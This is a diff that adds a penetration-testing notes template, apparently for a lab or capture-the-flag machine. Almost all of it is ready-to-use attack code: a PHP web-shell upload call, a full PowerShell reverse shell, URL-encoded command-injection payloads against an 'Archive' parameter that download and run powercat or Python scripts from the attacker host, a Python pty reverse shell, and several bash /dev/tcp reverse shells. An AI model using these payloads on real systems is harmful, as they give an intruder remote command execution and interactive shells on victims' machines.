@@ -1,0 +1,49 @@
+# Machine Notes Template
+## Target IP: <TARGET_IP>
+## Attacker IP: <ATTACKER_IP>
+
+## File Upload RCE
+# PHP file upload bypass - change extension to .pHP
+curl http://<TARGET_IP>/meteor/uploads/shell.pHP?cmd=whoami
+
+## PowerShell Reverse Shell
+$sm=(New-Object Net.Sockets.TCPClient("<ATTACKER_IP>",4444)).GetStream()
+[byte[]]$bt=0..65535|%{0}
+while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){
+    $d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i)
+    $st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1))
+    $sm.Write($st,0,$st.Length)
+}
+
+## Command Injection via Archive Parameter
+# Test command injection
+curl -X POST --data 'Archive=whoami' http://<TARGET_IP>:8000/archive
+
+# Powercat download and execute
+curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%204444%20-e%20powershell' http://<TARGET_IP>:8000/archive
+
+# Python reverse shell via curl pipe
+curl -X POST \
+--data 'Archive=git%3Bcurl%20-s%20http%3A%2F%2F<ATTACKER_IP>%2Fpython3ReverseShell.py%20%7C%20python3' \
+http://<TARGET_IP>:8000/archive
+
+# Bash reverse shell via command injection
+curl -X POST \
+--data 'Archive=whoami%3Bbash%20-i%20>&%20/dev/tcp/<ATTACKER_IP>/4444%200>&1' \
+http://<TARGET_IP>:8000/archive
+
+# Download and execute python reverse shell
+curl -X POST --data 'Archive=whoami%3Bcurl%20http%3A%2F%2F<ATTACKER_IP>%2Fprs.py%20-o%20%2Ftmp%2Fprs.py%3Bpython3%20%2Ftmp%2Fprs.py' http://<TARGET_IP>/archive
+
+# Python3 reverse shell one liner
+curl -X POST --data 'Archive=git%3Bpython3%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<ATTACKER_IP>%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27' http://<TARGET_IP>/archive
+
+## Bash Reverse Shells
+# Standard
+bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
+
+# Alternative
+bash -i > /dev/tcp/<ATTACKER_IP>/4444 0>&1 2>&1
+
+## Shell Script Method
+touch shell.sh && printf '#!/bin/bash\nbash -i > /dev/tcp/<ATTACKER_IP>/4444 0>&1 2>&1\n' > shell.sh && chmod +x shell.sh && ./shell.sh
